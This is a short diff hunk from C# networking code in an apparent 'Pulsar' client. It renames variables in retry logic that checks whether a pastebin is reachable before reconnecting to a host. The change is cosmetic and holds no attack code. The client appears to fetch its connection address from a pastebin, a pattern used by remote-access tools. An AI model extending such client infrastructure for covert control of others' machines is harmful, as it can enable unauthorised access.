@@ -84,13 +84,13 @@ namespace Pulsar.Client.Networking
                         Debug.WriteLine("Failed to get a valid host to connect to. Will retry after delay.");
                         
                         // Check pastebin status to determine appropriate wait time
-                        var (isReachable, suggestedWaitMs) = _hosts.GetPastebinStatus();
+                        var (IsReachable, SuggestedWaitTimeMs) = _hosts.GetPastebinStatus();
                         int waitTime;
                         
-                        if (!isReachable && suggestedWaitMs > 0)
+                        if (!IsReachable && SuggestedWaitTimeMs > 0)
                         {
                             // Use suggested wait time for pastebin failures (5+ minutes to avoid rate limiting)
-                            waitTime = suggestedWaitMs;
+                            waitTime = SuggestedWaitTimeMs;
                             Debug.WriteLine($"Pastebin unreachable, waiting {waitTime / 1000} seconds before retry");
                         }
                         else
